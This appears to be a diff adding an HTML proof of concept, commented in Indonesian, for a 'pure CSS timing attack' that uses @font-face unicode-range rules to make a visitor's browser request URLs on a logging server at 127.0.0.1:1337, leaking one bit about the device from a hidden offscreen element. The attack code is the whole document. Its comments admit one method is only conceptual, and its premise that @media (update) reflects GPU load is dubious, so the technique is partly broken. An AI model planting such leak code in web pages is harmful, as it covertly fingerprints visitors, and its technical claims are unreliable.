@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pure CSS Timing Attack</title>
+  <style>
+    /* 1. Definisikan font "mata-mata" kita */
+    /* Font ini hanya akan dimuat jika karakter 'A' (U+41) dibutuhkan */
+    @font-face {
+      font-family: 'LeakyFont_Bit1';
+      /* Rentang unicode untuk huruf 'A' */
+      unicode-range: U+41; 
+      /* Jika 'A' dibutuhkan, minta URL ini */
+      src: url('http://127.0.0.1:1337/leak.png?bit=1');
+    }
+    
+    /* Font ini hanya akan dimuat jika karakter 'B' (U+42) dibutuhkan */
+    @font-face {
+      font-family: 'LeakyFont_Bit0';
+      unicode-range: U+42;
+      src: url('http://127.0.0.1:1337/leak.png?bit=0');
+    }
+
+    /* 2. Setup trigger dan elemen yang dianimasikan */
+    #leaky-element {
+      /* Terapkan kedua font. Hanya satu yang akan aktif. */
+      font-family: 'LeakyFont_Bit1', 'LeakyFont_Bit0';
+      /* Sembunyikan elemen ini dari pandangan */
+      position: absolute;
+      top: -9999px;
+    }
+
+    #start-trigger:hover ~ #leaky-element {
+      /* Mulai animasi berat DAN animasi opacity secara bersamaan */
+      animation:
+        gpu-torture 50ms forwards,
+        opacity-race 50ms forwards;
+    }
+    
+    /* Animasi berat untuk menyebabkan lag GPU yang berbeda */
+    @keyframes gpu-torture {
+      from { filter: blur(0px) hue-rotate(0deg); }
+      to { filter: blur(10px) hue-rotate(360deg); }
+    }
+
+    /* 
+     * Animasi "perlombaan" opacity.
+     * Kita atur konten menjadi 'A' atau 'B' di tengah-tengah.
+     * Karena perbedaan performa GPU, pada 50% durasi (25ms),
+     * opacity yang dihitung akan sedikit berbeda.
+    */
+    @keyframes opacity-race {
+      0% { content: 'A'; } /* Defaultnya coba bocorkan 'A' (bit 1) */
+      49% { content: 'A'; }
+      /* 
+       * Tepat di tengah, jika opacity > 0.5 (animasi berjalan lancar), 
+       * biarkan 'A'. Jika opacity < 0.5 (animasi lag), ubah ke 'B'.
+       * Ini adalah bagian konseptual yang sulit diimplementasikan langsung.
+       * Mari kita sederhanakan.
+      */
+      100% { opacity: 0; }
+    }
+
+    /*
+     * PENDEKATAN LEBIH BAIK: Gunakan @media query berbasis performa
+     * Ini lebih modern dan relevan.
+    */
+    #leaky-element-2 {
+      font-family: 'LeakyFont_Bit1', 'LeakyFont_Bit0';
+      position: absolute; top: -9999px;
+    }
+
+    /* 
+     * @media (update: slow) -> Cocok jika perangkat lambat me-refresh. 
+     * Ini bisa dipengaruhi oleh beban GPU!
+    */
+    @media (update: slow) {
+      #leaky-element-2::after {
+        content: 'B'; /* Perangkat lambat, bocorkan bit 0 */
+      }
+    }
+    @media (update: fast) {
+      #leaky-element-2::after {
+        content: 'A'; /* Perangkat cepat, bocorkan bit 1 */
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <h1 id="start-trigger">Arahkan Mouse ke sini untuk memulai</h1>
+  <div id="leaky-element"></div>
+  <div id="leaky-element-2"></div>
+  <p>Cek log server Anda. Metode @media (update) lebih mungkin berhasil.</p>
+</body>
+</html>
